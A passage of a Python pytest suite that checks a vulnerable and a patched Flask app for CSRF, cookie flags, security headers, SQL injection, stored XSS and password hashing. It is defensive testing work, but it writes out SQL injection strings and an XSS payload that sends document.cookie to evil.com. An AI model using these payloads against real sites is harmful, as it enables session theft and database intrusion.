        )

    # -------------------------------------------------------------------------
    # CSRF-03 | CWE-352 | CVSS 8.8
    # Security Objective: form-encoded cross-origin POST (no preflight) blocked.
    # Both app versions: endpoint processes form data → TEST FAILS.
    # -------------------------------------------------------------------------
    def test_cross_origin_form_post_is_rejected(self, client):
        """
        CSRF-03 | CSRF via Simple-Request (form/urlencoded) Vector (CWE-352)

        HTML forms can POST application/x-www-form-urlencoded cross-origin
        without triggering a CORS preflight.  The API must reject this
        content-type on mutation endpoints to prevent the simple-request CSRF
        vector.  Expected: 400 (can't parse body), 401, 403, or 415.
        """
        response = client.post(
            "/api/users/1/update",
            data="bio=csrf_via_html_form",
            content_type="application/x-www-form-urlencoded",
            headers={"Origin": "https://evil.example.com"},
        )
        assert response.status_code != 200, (
            f"[CSRF-03] SECURITY BUG: Form-encoded cross-origin POST to "
            f"/api/users/1/update returned HTTP {response.status_code}. "
            "The simple-request CSRF vector is open."
        )

    # -------------------------------------------------------------------------
    # CSRF-04 | CWE-1275 | CVSS 6.5
    # Security Objective: Auth cookie must have SameSite=Strict or Lax.
    # Vulnerable app: issues no cookie        → TEST SKIPS.
    # Fixed app     : SameSite=Strict cookie  → TEST PASSES.
    # -------------------------------------------------------------------------
    def test_auth_cookie_has_samesite_strict_attribute(self, client):
        """
        CSRF-04 | Cookie Without SameSite Attribute (CWE-1275)

        After a successful login, the auth_token cookie must carry
        SameSite=Strict to prevent cross-site submission.  In fixed_app.py
        set_cookie(..., samesite='Strict') is used.  In app.py no cookie
        is issued at all (state is returned in the JSON body for localStorage).
        """
        # Try to login with known-working seed credentials.
        # If DB is unavailable the test skips gracefully.
        response = _login(client, "admin", "admin123")
        cookies = response.headers.getlist("Set-Cookie")

        if not cookies:
            pytest.skip(
                "[CSRF-04] No Set-Cookie header issued — app.py stores "
                "credentials in localStorage (separate XSS theft risk). "
                "Skipping SameSite check."
            )

        for cookie in cookies:
            assert "SameSite=Strict" in cookie or "SameSite=Lax" in cookie, (
                f"[CSRF-04] SECURITY BUG: Cookie issued without SameSite "
                f"attribute: {cookie}"
            )

    # -------------------------------------------------------------------------
    # CSRF-05 | CWE-352 | CVSS 8.8
    # Security Objective: /api/change-password must require JWT (not just cookie).
    # Vulnerable app: endpoint absent → TEST SKIPS.
    # Fixed app     : JWT required, 401 without token → TEST PASSES.
    # -------------------------------------------------------------------------
    def test_change_password_requires_jwt_not_just_cookie(self, client):
        """
        CSRF-05 | CSRF on Password-Change Endpoint (CWE-352)

        POST /api/change-password must require a valid JWT bearer token.
        A CSRF-only attack (no JWT in Authorization header) must be rejected
        with 401, even if an auth_token cookie is present.
        This endpoint exists only in fixed_app.py; the test auto-skips on app.py.
        """
        if not _has_endpoint("/api/change-password"):
            pytest.skip(
                "[CSRF-05] /api/change-password endpoint not present in this "
                "app version (app.py). Skipping."
            )

        response = client.post(
            "/api/change-password",
            json={"password": "NewPassw0rd!"},
            # No Authorization header — simulating a CSRF attack from a
            # third-party page that can include cookies but not custom headers
        )
        assert response.status_code == 401, (
            f"[CSRF-05] SECURITY BUG: POST /api/change-password returned "
            f"HTTP {response.status_code} without an Authorization header. "
            "Password change is CSRF-vulnerable."
        )


# =============================================================================
# SECTION 4 — SESSION AND COOKIE SECURITY
# OWASP A02:2021 – Cryptographic Failures
# CVSS Base Score: 6.1 – 8.8
#
# DUAL-OUTCOME EXPECTATIONS
# ─────────────────────────────────────────────────────────────────────────────
# Test        │ app.py (vulnerable)         │ fixed_app.py (patched)
# ────────────┼─────────────────────────────┼──────────────────────────────────
# COOKIE-01   │ SKIP – no cookie issued     │ PASS – HttpOnly set
# COOKIE-02   │ SKIP – no cookie issued     │ PASS – SameSite=Strict set
# COOKIE-03   │ SKIP – no cookie issued     │ CONDITIONAL – Secure if HTTPS
# COOKIE-04   │ SKIP – no cookie issued     │ PASS – no PII in cookie value
# =============================================================================

class TestSessionAndCookieSecurity:
    """
    Section 4: Cookie attribute verification.

    app.py returns credentials in the JSON body for localStorage storage
    (which creates an XSS theft risk).  fixed_app.py sets an auth_token
    cookie with HttpOnly + SameSite=Strict.
    """

    # -------------------------------------------------------------------------
    # COOKIE-01 | CWE-1004 | CVSS 6.5
    # Security Objective: Auth cookie must carry HttpOnly flag.
    # -------------------------------------------------------------------------
    def test_auth_cookie_has_httponly_flag(self, client):
        """
        COOKIE-01 | Cookie Without HttpOnly Flag (CWE-1004)

        The HttpOnly attribute prevents JavaScript from reading the cookie,
        protecting the session token against XSS-based theft.
        In fixed_app.py: set_cookie(..., httponly=True).
        """
        response = _login(client, "admin", "admin123")
        cookies = response.headers.getlist("Set-Cookie")

        if not cookies:
            pytest.skip(
                "[COOKIE-01] No Set-Cookie header issued by /api/login. "
                "This app version stores credentials in JSON body / localStorage "
                "— a separate XSS theft risk documented under INPUT-09."
            )

        for cookie in cookies:
            assert "HttpOnly" in cookie, (
                f"[COOKIE-01] SECURITY BUG: Cookie missing HttpOnly flag: {cookie}"
            )

    # -------------------------------------------------------------------------
    # COOKIE-02 | CWE-1275 | CVSS 6.5
    # Security Objective: Auth cookie must carry SameSite=Strict or Lax.
    # -------------------------------------------------------------------------
    def test_auth_cookie_has_samesite_attribute(self, client):
        """
        COOKIE-02 | Cookie Without SameSite Attribute (CWE-1275)

        SameSite=Strict prevents the cookie from being sent on cross-site
        requests.  fixed_app.py sets samesite='Strict' on the auth_token.
        """
        response = _login(client, "admin", "admin123")
        cookies = response.headers.getlist("Set-Cookie")

        if not cookies:
            pytest.skip("[COOKIE-02] No cookies issued; skipping SameSite check.")

        for cookie in cookies:
            assert ("SameSite=Strict" in cookie or "SameSite=Lax" in cookie), (
                f"[COOKIE-02] SECURITY BUG: Cookie missing SameSite attribute: "
                f"{cookie}"
            )

    # -------------------------------------------------------------------------
    # COOKIE-03 | CWE-614 | CVSS 6.5
    # Security Objective: Auth cookie must carry Secure flag in production.
    # Note: fixed_app.py sets Secure only when USE_HTTPS=True.
    #       In test env USE_HTTPS=False, so this test documents the gap.
    # -------------------------------------------------------------------------
    def test_auth_cookie_has_secure_flag(self, client):
        """
        COOKIE-03 | Cookie Without Secure Flag (CWE-614)

        The Secure attribute prevents cookie transmission over plain HTTP.
        fixed_app.py sets Secure only when USE_HTTPS env-var is truthy.
        In test environments USE_HTTPS=False so the Secure flag is absent —
        this test documents the deployment-time requirement.
        """
        response = _login(client, "admin", "admin123")
        cookies = response.headers.getlist("Set-Cookie")

        if not cookies:
            pytest.skip("[COOKIE-03] No cookies issued; skipping Secure check.")

        use_https = os.environ.get("USE_HTTPS", "false").lower() in ("1", "true", "yes")
        if not use_https:
            pytest.skip(
                "[COOKIE-03] USE_HTTPS is not set — Secure flag intentionally "
                "absent in local/test mode.  Deploy with USE_HTTPS=true and "
                "rerun to verify the Secure flag is applied in production."
            )

        for cookie in cookies:
            assert "Secure" in cookie, (
                f"[COOKIE-03] SECURITY BUG: Cookie missing Secure flag "
                f"despite USE_HTTPS=true: {cookie}"
            )

    # -------------------------------------------------------------------------
    # COOKIE-04 | CWE-312 | CVSS 7.5
    # Security Objective: Cookie value must not contain plaintext credentials.
    # -------------------------------------------------------------------------
    def test_auth_cookie_does_not_contain_plaintext_password(self, client):
        """
        COOKIE-04 | Plaintext Credentials in Cookie (CWE-312)

        If a cookie is issued, its value must not contain the plaintext
        password or other sensitive fields in clear form.
        The JWT payload is base64-encoded (not encrypted), so sensitive
        claims should not be added.
        """
        password = "admin123"
        response = _login(client, "admin", password)
        cookies = response.headers.getlist("Set-Cookie")

        if not cookies:
            pytest.skip("[COOKIE-04] No cookies issued; skipping PII check.")

        for cookie in cookies:
            cookie_value = cookie.split("=", 1)[-1].split(";")[0]
            assert password not in cookie_value, (
                "[COOKIE-04] SECURITY BUG: Plaintext password found in cookie value."
            )


# =============================================================================
# SECTION 5 — TRANSPORT SECURITY (HTTP Headers)
# OWASP A02:2021 – Cryptographic Failures
# CVSS Base Score: 5.3 – 7.4
#
# DUAL-OUTCOME EXPECTATIONS
# ─────────────────────────────────────────────────────────────────────────────
# Test        │ app.py (vulnerable)      │ fixed_app.py (patched)
# ────────────┼──────────────────────────┼────────────────────────────────────
# TLS-01      │ FAIL – HSTS absent       │ PASS – HSTS header set
# TLS-02      │ FAIL – XCTO absent       │ PASS – nosniff set
# TLS-03      │ FAIL – XFO absent        │ PASS – DENY set
# TLS-04      │ FAIL – CSP absent        │ PASS – default-src 'self'
# TLS-05      │ FAIL – XXSS absent       │ PASS – 1; mode=block set
# =============================================================================

class TestTransportSecurity:
    """
    Section 5: HTTP security header verification.

    fixed_app.py adds all five headers via the @after_request hook.
    app.py adds none.  All five tests FAIL on app.py and PASS on fixed_app.py.
    """

    # -------------------------------------------------------------------------
    # TLS-01 | CWE-523 | CVSS 7.4
    # -------------------------------------------------------------------------
    def test_strict_transport_security_header_present(self, client):
        """
        TLS-01 | Missing Strict-Transport-Security Header (CWE-523)

        HSTS instructs browsers to use HTTPS for all future visits.
        Without it a first-visit MITM attacker can downgrade to HTTP and
        intercept credentials transmitted in plaintext.
        Expected: Strict-Transport-Security: max-age=31536000; includeSubDomains
        """
        response = client.get("/api/posts")
        hsts = response.headers.get("Strict-Transport-Security", "")
        assert "max-age=" in hsts, (
            f"[TLS-01] SECURITY BUG: Strict-Transport-Security header is "
            f"'{hsts or 'ABSENT'}'. HTTPS is not enforced for future requests."
        )

    # -------------------------------------------------------------------------
    # TLS-02 | CWE-116 | CVSS 5.3
    # -------------------------------------------------------------------------
    def test_x_content_type_options_nosniff_header_present(self, client):
        """
        TLS-02 | Missing X-Content-Type-Options Header (CWE-116)

        'nosniff' prevents browsers from MIME-type sniffing JSON responses
        as HTML/script, blocking a class of content-injection XSS attacks.
        Expected: X-Content-Type-Options: nosniff
        """
        response = client.get("/api/posts")
        xcto = response.headers.get("X-Content-Type-Options", "")
        assert xcto.lower() == "nosniff", (
            f"[TLS-02] SECURITY BUG: X-Content-Type-Options is "
            f"'{xcto or 'ABSENT'}'. MIME sniffing is not prevented."
        )

    # -------------------------------------------------------------------------
    # TLS-03 | CWE-1021 | CVSS 6.1
    # -------------------------------------------------------------------------
    def test_x_frame_options_deny_header_present(self, client):
        """
        TLS-03 | Missing X-Frame-Options Header (CWE-1021)

        Without X-Frame-Options (or CSP frame-ancestors) the application can
        be embedded in a third-party iframe, enabling clickjacking attacks
        where the victim is tricked into performing unintended actions.
        Expected: X-Frame-Options: DENY
        """
        response = client.get("/api/posts")
        xfo = response.headers.get("X-Frame-Options", "").upper()
        assert xfo in ("DENY", "SAMEORIGIN"), (
            f"[TLS-03] SECURITY BUG: X-Frame-Options is '{xfo or 'ABSENT'}'. "
            "Clickjacking protection is not enforced."
        )

    # -------------------------------------------------------------------------
    # TLS-04 | CWE-1173 | CVSS 6.1
    # -------------------------------------------------------------------------
    def test_content_security_policy_header_present(self, client):
        """
        TLS-04 | Missing Content-Security-Policy Header (CWE-1173)

        CSP restricts which scripts, styles, and resources the browser will
        execute.  Its presence substantially limits the impact of any stored
        XSS payload that makes it through server-side sanitisation.
        Expected: Content-Security-Policy: default-src 'self'
        """
        response = client.get("/api/posts")
        csp = response.headers.get("Content-Security-Policy", "")
        assert csp, (
            f"[TLS-04] SECURITY BUG: Content-Security-Policy header is "
            f"ABSENT. XSS payloads have no browser-level execution barrier."
        )
        assert "default-src" in csp, (
            f"[TLS-04] SECURITY BUG: CSP present but lacks default-src "
            f"directive: '{csp}'"
        )

    # -------------------------------------------------------------------------
    # TLS-05 | CWE-79 (mitigation layer) | CVSS 5.3
    # -------------------------------------------------------------------------
    def test_x_xss_protection_header_present(self, client):
        """
        TLS-05 | Missing X-XSS-Protection Header

        The X-XSS-Protection header activates the browser's built-in XSS
        filter (Chrome/IE/Edge legacy).  While largely superseded by CSP,
        its presence adds a defence-in-depth layer.
        Expected: X-XSS-Protection: 1; mode=block
        """
        response = client.get("/api/posts")
        xxp = response.headers.get("X-XSS-Protection", "")
        assert xxp, (
            f"[TLS-05] X-XSS-Protection header is ABSENT. "
            "Legacy browser XSS filter is not activated."
        )
        assert "1" in xxp, (
            f"[TLS-05] X-XSS-Protection header present but disabled: '{xxp}'"
        )


# =============================================================================
# SECTION 6 — INPUT VALIDATION TESTS
# OWASP A03:2021 – Injection
# CVSS Base Score: 7.5 – 9.8 (Critical for SQL Injection)
#
# DUAL-OUTCOME EXPECTATIONS
# ─────────────────────────────────────────────────────────────────────────────
# Test          │ app.py (vulnerable)              │ fixed_app.py (patched)
# ──────────────┼──────────────────────────────────┼───────────────────────────
# INPUT-01      │ FAIL – SQLi login bypass works   │ PASS – parameterised query
# INPUT-02      │ FAIL (time-based, slow response) │ PASS – parameterised query
# INPUT-03      │ FAIL – SQLi search dumps all     │ PASS – parameterised query
# INPUT-04      │ FAIL – UNION SELECT exfiltrates  │ PASS – parameterised query
# INPUT-05      │ FAIL – malformed JSON → 500/None │ PASS – or {} guard
# INPUT-06      │ FAIL – empty body → 500          │ PASS – or {} guard
# INPUT-07      │ FAIL – no length limit           │ PASS – len(username)>150
# INPUT-08      │ FAIL – mass-assignment possible  │ PASS – fields whitelisted
# INPUT-09      │ FAIL – <script> stored raw       │ PASS – bleach strips tags
# INPUT-10      │ FAIL – onerror stored raw        │ PASS – bleach strips attrs
# INPUT-11      │ FAIL – null byte passes          │ PASS – strip() removes it
# INPUT-12      │ FAIL – plaintext password stored │ PASS – bcrypt hash stored
# =============================================================================

class TestInputValidation:
    """
    Section 6: Input validation and injection prevention.

    The six SQL-injection tests target TWO query sites confirmed in app.py:
      1. /api/login  — f-string with username AND password
      2. /api/search — f-string with query parameter

    The XSS tests verify that stored comment/post content is sanitised
    before it is returned in GET /api/posts.
    """

    # -------------------------------------------------------------------------
    # INPUT-01 | CWE-89 | CVSS 9.8
    # Classic OR-1=1 authentication bypass.
    # Vulnerable app: bypass succeeds (200) → TEST FAILS → CRITICAL BUG.
    # Fixed app     : parameterised query → user not found → 401 → PASS.
    # -------------------------------------------------------------------------
    def test_sql_injection_login_bypass_or_1_equals_1(self, client):
        """
        INPUT-01 | SQL Injection — Authentication Bypass (CWE-89)

        The classic 'OR 1=1' tautology modifies the WHERE clause in app.py:
            SELECT * FROM users WHERE username = 'x' OR '1'='1' AND password = '...'
        making it return the first row regardless of password.
        fixed_app.py uses a parameterised query, so the literal string
        "x' OR '1'='1" is compared as a username — no rows match → 401.
        """
        response = _login(client, "x' OR '1'='1' --", "wrong_password")
        assert response.status_code == 401, (
            f"[INPUT-01] SECURITY BUG: SQL Injection login bypass SUCCEEDED "
            f"(HTTP {response.status_code}). The login query is not parameterised. "
            "CVSS 9.8 — CRITICAL."
        )

    # -------------------------------------------------------------------------
    # INPUT-02 | CWE-89 | CVSS 9.8
    # Time-based blind SQL injection via SLEEP().
    # -------------------------------------------------------------------------
    def test_sql_injection_time_based_blind_login(self, client):
        """
        INPUT-02 | SQL Injection — Time-Based Blind (CWE-89)

        If the DB executes SLEEP(2) the response will be delayed ≥ 2 s.
        A response time < 3 s combined with a 401 confirms the payload was
        treated as a literal string (parameterised) and not executed.
        """
        start = time.monotonic()
        response = _login(client, "admin'; SELECT SLEEP(2); -- ", "pass")
        elapsed = time.monotonic() - start

        assert response.status_code == 401, (
            f"[INPUT-02] Time-based SQLi payload returned HTTP "
            f"{response.status_code}; expected 401."
        )
        assert elapsed < 4.0, (
            f"[INPUT-02] SECURITY BUG: Response took {elapsed:.2f} s — "
            "SLEEP(2) likely executed in the database. Blind SQL Injection confirmed."
        )

    # -------------------------------------------------------------------------
    # INPUT-03 | CWE-89 | CVSS 9.8
    # OR-1=1 in search endpoint dumps all user records.
    # Vulnerable app: returns all rows (200 + large result) → TEST FAILS.
    # Fixed app     : parameterised LIKE → only literal matches → 200 + 0 rows.
    # -------------------------------------------------------------------------
    def test_sql_injection_search_or_1_equals_1_dumps_all_users(self, client):
        """
        INPUT-03 | SQL Injection — Full Table Dump via Search (CWE-89)

        The vulnerable search query:
            SELECT id, username FROM users WHERE username LIKE '%' OR '1'='1%'
        returns every row when the payload "' OR '1'='1" is injected.
        The parameterised version treats the entire string as a literal LIKE
        pattern, matching no real username → empty results.
        """
        response = client.get("/api/search?q=' OR '1'='1")
        if response.status_code == 200:
            body = response.get_json() or {}
            results = body.get("results", [])
            assert len(results) <= 1, (
                f"[INPUT-03] SECURITY BUG: SQL injection in ?q= returned "
                f"{len(results)} rows (full table dump). CVSS 9.8 — CRITICAL."
            )
        else:
            # 400/401/403 are all acceptable rejections
            assert response.status_code in (400, 401, 403, 500), (
                f"[INPUT-03] Unexpected HTTP {response.status_code} from search."
            )

    # -------------------------------------------------------------------------
    # INPUT-04 | CWE-89 | CVSS 9.8
    # UNION SELECT schema exfiltration via search.
    # Vulnerable app: UNION rows appear in results → TEST FAILS.
    # Fixed app     : literal string comparison → no schema data → PASS.
    # -------------------------------------------------------------------------
    def test_sql_injection_union_select_schema_exfiltration(self, client):
        """
        INPUT-04 | SQL Injection — UNION SELECT Data Extraction (CWE-89)

        A UNION SELECT payload attempts to append information_schema rows.
        If any result contains 'information_schema', the injection succeeded.
        """
        payload = "x' UNION SELECT table_name,table_schema FROM information_schema.tables -- "
        response = client.get(f"/api/search?q={payload}")
        if response.status_code == 200:
            raw = response.get_data(as_text=True).lower()
            assert "information_schema" not in raw, (
                "[INPUT-04] SECURITY BUG: UNION SELECT injected schema info "
                "into search results. Full DB structure is exposed."
            )

    # -------------------------------------------------------------------------
    # INPUT-05 | CWE-20 | CVSS 5.3
    # Malformed JSON body must return 400, not 500 + stack trace.
    # Vulnerable app: NoneType.get() AttributeError → 500 → TEST FAILS.
    # Fixed app     : `data = request.json or {}` guard → 401 → PASS.
    # -------------------------------------------------------------------------
    def test_malformed_json_body_returns_400_not_500(self, client):
        """
        INPUT-05 | Improper Input Validation — Malformed JSON (CWE-20)

        Submitting syntactically invalid JSON must not crash the server.
        In app.py, request.json returns None for bad JSON; calling
        None.get('username') raises AttributeError → unhandled 500.
        In fixed_app.py: `data = request.json or {}` prevents the crash.
        """
        response = client.post(
            "/api/login",
            data="{ this is not : valid json }}}",
            content_type="application/json",
        )
        assert response.status_code != 500, (
            f"[INPUT-05] SECURITY BUG: Malformed JSON body caused "
            f"HTTP 500 Internal Server Error. Stack trace may be exposed."
        )
        body = response.get_data(as_text=True).lower()
        assert "traceback" not in body, (
            "[INPUT-05] SECURITY BUG: Server error response contains a "
            "Python traceback. Internal implementation details are leaked."
        )

    # -------------------------------------------------------------------------
    # INPUT-06 | CWE-476 | CVSS 5.3
    # Completely empty body must not crash server.
    # Vulnerable app: NoneType.get() → 500 → TEST FAILS.
    # Fixed app     : or {} guard → 401 → PASS.
    # -------------------------------------------------------------------------
    def test_empty_json_body_does_not_cause_500(self, client):
        """
        INPUT-06 | Null Dereference on Empty Request Body (CWE-476)

        An empty POST body causes request.json to return None.
        Calling None.get('username') raises AttributeError → 500.
        This exposes the technology stack to attackers and aids reconnaissance.
        """
        response = client.post(
            "/api/login",
            data="",
            content_type="application/json",
        )
        assert response.status_code != 500, (
            f"[INPUT-06] SECURITY BUG: Empty request body caused "
            f"HTTP {response.status_code} (Internal Server Error). "
            "NoneType.get() not guarded."
        )

    # -------------------------------------------------------------------------
    # INPUT-07 | CWE-400 | CVSS 7.5
    # Oversized input (100 KB username) must be rejected.
    # Vulnerable app: passed to DB → may cause 1292/1406 MySQL error → TEST FAILS.
    # Fixed app     : len(username) > 150 → 400 → PASS.
    # -------------------------------------------------------------------------
    def test_oversized_username_is_rejected_with_400(self, client):
        """
        INPUT-07 | Uncontrolled Resource Consumption — Oversized Input (CWE-400)

        A 100 KB username must be rejected before it reaches the database.
        fixed_app.py enforces len(username) > 150 → 400.
        app.py passes the full string to the f-string query, potentially
        causing a MySQL ER_DATA_TOO_LONG error or consuming excess memory.
        """
        huge_username = "A" * 100_000
        response = _login(client, huge_username, "password")
        assert response.status_code in (400, 401, 413, 422), (
            f"[INPUT-07] SECURITY BUG: 100 KB username returned "
            f"HTTP {response.status_code}. No length limit enforced."
        )

    # -------------------------------------------------------------------------
    # INPUT-08 | CWE-915 | CVSS 6.5
    # Mass-assignment via extra JSON parameters (role, is_admin).
    # Both apps: INSERT only whitelists explicit columns → likely safe.
    # This test confirms no privilege escalation via extra fields.
    # -------------------------------------------------------------------------
    def test_extra_json_parameters_do_not_grant_admin_role(self, client):
        """
        INPUT-08 | Mass Assignment — Extra JSON Parameters (CWE-915)

        Supplying 'role': 'admin' or 'is_admin': True in the register body
        must not elevate the created account's privileges.
        Both apps use explicit INSERT column lists, so extra keys are ignored
        at the SQL level — but this test confirms the DB schema protects it.
        """
        response = client.post(
            "/api/register",
            json={
                "username": "mass_assign_test",
                "email": "massassign@test.com",
                "password": "ValidPass1!",
                "role": "admin",          # unexpected / dangerous field
                "is_admin": True,         # unexpected / dangerous field
                "user_id": 999,           # ID squatting attempt
            },
        )
        if response.status_code in (200, 201):
            conn = get_db_connection()
            if conn:
                cursor = conn.cursor(dictionary=True)
                cursor.execute(
                    "SELECT * FROM users WHERE username = %s",
                    ("mass_assign_test",),
                )
                user = cursor.fetchone()
                cursor.close()
                conn.close()
                if user:
                    role = user.get("role", "user")
                    assert role != "admin", (
                        "[INPUT-08] SECURITY BUG: Mass-assignment elevated "
                        "newly registered user to 'admin' role via JSON body."
                    )

    # -------------------------------------------------------------------------
    # INPUT-09 | CWE-79 | CVSS 8.8
    # Stored XSS — <script> tag in comment must be stripped.
    # Vulnerable app: stored raw, returned in GET /api/posts → TEST FAILS.
    # Fixed app     : bleach.clean(content, tags=[], strip=True) → PASS.
    #
    # NOTE: /api/comments in fixed_app.py requires JWT. We supply a valid one.
    # -------------------------------------------------------------------------
    def test_stored_xss_script_tag_in_comment_is_sanitized(self, client):
        """
        INPUT-09 | Stored XSS — <script> Tag in Comment (CWE-79)

        A comment containing <script>alert('XSS')</script> must be sanitised
        before storage so that GET /api/posts does not return executable JS.
        In fixed_app.py: bleach.clean(content, tags=[], strip=True) removes tags.
        In app.py:       raw HTML is stored and echoed back — XSS confirmed.
        """
        xss_comment = "<script>alert('XSS_SEC_TEST')</script>"
        valid_token = _make_valid_jwt(user_id=1, username="admin")

        # Try to post the comment; on app.py no auth needed, on fixed_app JWT needed.
        client.post(
            "/api/comments",
            json={"content": xss_comment, "post_id": 1, "user_id": 1},
            headers=_auth_header(valid_token),
        )

        response = client.get("/api/posts")
        body = response.get_data(as_text=True)

        # The raw <script> tag must not appear in the API response.
        # bleach strips it; markupsafe.escape turns < into &lt; — both are safe.
        assert "<script>" not in body, (
            "[INPUT-09] SECURITY BUG: Stored XSS — raw <script> tag returned "
            "in GET /api/posts. Comment content is not sanitised. "
            "CVSS 8.8 — HIGH."
        )

    # -------------------------------------------------------------------------
    # INPUT-10 | CWE-79 | CVSS 8.8
    # Stored XSS — img onerror event handler in comment.
    # Vulnerable app: onerror stored raw → TEST FAILS.
    # Fixed app     : bleach strips attributes → PASS.
    # -------------------------------------------------------------------------
    def test_stored_xss_img_onerror_in_comment_is_sanitized(self, client):
        """
        INPUT-10 | Stored XSS — img onerror Event Handler (CWE-79)

        The onerror vector fires automatically without user interaction
        whenever the page loads, making it more dangerous than a <script> tag
        that CSP might block.  bleach.clean with strip=True removes the tag.
        """
        xss_comment = "<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">"
        valid_token = _make_valid_jwt(user_id=1, username="admin")

        client.post(
            "/api/comments",
            json={"content": xss_comment, "post_id": 1, "user_id": 1},
            headers=_auth_header(valid_token),
        )

        response = client.get("/api/posts")
        body = response.get_data(as_text=True)

        assert "onerror" not in body, (
            "[INPUT-10] SECURITY BUG: Stored XSS — 'onerror' attribute found "
            "in GET /api/posts. bleach sanitisation is absent or insufficient."
        )

    # -------------------------------------------------------------------------
    # INPUT-11 | CWE-158 | CVSS 5.3
    # Null byte injection in login username.
    # Vulnerable app: passes to f-string (may truncate query) → TEST FAILS.
    # Fixed app     : .strip() removes it; parameterised query safe → PASS.
    # -------------------------------------------------------------------------
    def test_null_byte_in_login_username_is_rejected(self, client):
        """
        INPUT-11 | Null Byte Injection in Username (CWE-158)

        A null byte (\x00) can truncate strings at the C library level,
        potentially bypassing validation applied after the null byte.
        fixed_app.py's .strip() call removes leading/trailing whitespace
        (though internal null bytes require explicit sanitisation).
        The parameterised query treats the full string as a literal value.
        """
        response = _login(client, "admin\x00extra_suffix", "password")
        assert response.status_code in (400, 401), (
            f"[INPUT-11] SECURITY BUG: Null byte in username returned "
            f"HTTP {response.status_code}. Input not sanitised."
        )

    # -------------------------------------------------------------------------
    # INPUT-12 | CWE-256 | CVSS 9.1
    # Password must be stored as bcrypt hash, not plaintext.
    # Vulnerable app: plaintext stored → TEST FAILS → CRITICAL BUG.
    # Fixed app     : bcrypt.hashpw → $2b$ prefix → PASS.
    # -------------------------------------------------------------------------
    def test_password_is_stored_as_bcrypt_hash_not_plaintext(self, client):
        """
        INPUT-12 | Plaintext Password Storage (CWE-256)

        After registering a user the stored password must be a bcrypt hash
        beginning with '$2b$' or '$2a$', NOT the raw plaintext string.
        In app.py: password stored verbatim — a single DB breach exposes all
        credentials and allows cross-service credential stuffing.
        In fixed_app.py: bcrypt.hashpw(..., bcrypt.gensalt()).decode()
        """
        plaintext = "HashCheckPwd_555!"
        username = "hash_verify_user"
        client.post(
            "/api/register",
            json={
                "username": username,
                "email": "hashverify@test.com",
                "password": plaintext,
            },
        )

        conn = get_db_connection()
        if conn is None:
            pytest.skip("[INPUT-12] DB unavailable; skipping hash verification.")

        cursor = conn.cursor(dictionary=True)
        cursor.execute(
            "SELECT password FROM users WHERE username = %s", (username,)
        )
        row = cursor.fetchone()
        cursor.close()
        conn.close()

        if row is None:
            pytest.skip(
                "[INPUT-12] Test user not found in DB. "
                "Likely a DB connection issue or registration failed."
            )

        stored = row["password"]
        assert stored != plaintext, (
            "[INPUT-12] SECURITY BUG: Password is stored in PLAINTEXT. "
            "A single database breach exposes all user credentials. "
            "CVSS 9.1 — CRITICAL."
        )
        assert stored.startswith(("$2b$", "$2a$", "$argon2")), (
            f"[INPUT-12] SECURITY BUG: Password is not stored with a recognised "
            f"KDF (bcrypt/Argon2). Value starts with: '{stored[:10]}...'"
        )

    # -------------------------------------------------------------------------
    # INPUT-13 | CWE-20 | CVSS 5.3
    # Short password (< 6 chars) must be rejected by fixed_app.py.
    # Vulnerable app: accepts and stores any length → TEST FAILS.
    # Fixed app     : len(password) < 6 → 400 → PASS.
    # -------------------------------------------------------------------------
    def test_weak_short_password_is_rejected_on_registration(self, client):
        """
        INPUT-13 | Insufficient Password Length Enforcement (CWE-20)

        POST /api/register must reject passwords shorter than the minimum
        length (6 characters in fixed_app.py).  Allowing single-character
        passwords enables trivial brute-force even with rate limiting.
        """
        response = client.post(
            "/api/register",
            json={
                "username": "short_pw_user",
                "email": "shortpw@test.com",
                "password": "abc",           # 3 chars — below minimum
            },
        )
        assert response.status_code == 400, (
            f"[INPUT-13] SECURITY BUG: Password 'abc' (3 chars) was accepted "
            f"by /api/register (HTTP {response.status_code}). "
            "Minimum password length is not enforced."
        )

    # -------------------------------------------------------------------------
    # INPUT-14 | CWE-20 | CVSS 4.3
    # Invalid email address must be rejected by fixed_app.py.
    # Vulnerable app: accepts any string in email field → TEST FAILS.
    # Fixed app     : email_validator → EmailNotValidError → 400 → PASS.
    # -------------------------------------------------------------------------
    def test_invalid_email_address_is_rejected_on_registration(self, client):
        """
        INPUT-14 | Improper Email Validation on Registration (CWE-20)

        POST /api/register must validate email format.  Accepting arbitrary
        strings as email addresses can cause DB integrity issues and aids
        enumeration / abuse.  fixed_app.py uses the email-validator library.
        """
        response = client.post(
            "/api/register",
            json={
                "username": "bademail_user",
                "email": "this-is-not-an-email",   # clearly invalid
                "password": "ValidPass99!",
            },
        )
        assert response.status_code == 400, (
            f"[INPUT-14] SECURITY BUG: Invalid email 'this-is-not-an-email' "
            f"was accepted by /api/register (HTTP {response.status_code}). "
            "Email validation is absent."
        )

    # -------------------------------------------------------------------------
    # INPUT-15 | CWE-79 | CVSS 8.8
    # XSS in post bio field via /api/users/<id>/update.
    # Vulnerable app: stored raw → TEST FAILS.
    # Fixed app     : bleach.clean(bio, tags=[], strip=True) → PASS.
    # -------------------------------------------------------------------------
    def test_xss_in_bio_update_is_sanitized(self, client):
        """
        INPUT-15 | Stored XSS — Script Tag in User Bio (CWE-79)

        POST /api/users/<id>/update stores the bio field.
        A <script> payload in the bio must be stripped by bleach before storage
        so that profile views do not serve executable JavaScript.
        """
        xss_bio = "<script>document.location='https://evil.com'</script>"
        response = client.post(
            "/api/users/1/update",
            json={"bio": xss_bio},
        )
        # The update may succeed (200) or fail due to missing auth (401).
        # The critical assertion is against what is stored — read it back.
        if response.status_code == 200:
            profile = client.get("/api/users/1")
            if profile.status_code == 200:
                body = profile.get_data(as_text=True)
                assert "<script>" not in body, (
                    "[INPUT-15] SECURITY BUG: Stored XSS — <script> tag "
                    "survived the bio update and was returned by GET /api/users/1."
                )


# =============================================================================
# SECTION 7 — JWT-SPECIFIC ATTACK TESTS (fixed_app.py only)
# OWASP A07:2021 – Identification and Authentication Failures
# CVSS Base Score: 9.8 (Critical) for token forging
#
# These tests target the JWT implementation that EXISTS ONLY in fixed_app.py.
# On app.py (no JWT layer) the tests auto-skip because any request to a
# protected endpoint either returns 201 without a token (wrong reason)
# or the endpoint doesn't exist.
#
# DUAL-OUTCOME EXPECTATIONS
# ─────────────────────────────────────────────────────────────────────────────
# Test         │ app.py (vulnerable)    │ fixed_app.py (patched)
# ─────────────┼────────────────────────┼────────────────────────────────────
# JWT-01       │ SKIP (no JWT layer)    │ PASS – weak key flagged
# JWT-02       │ SKIP (no JWT layer)    │ PASS – forged token rejected
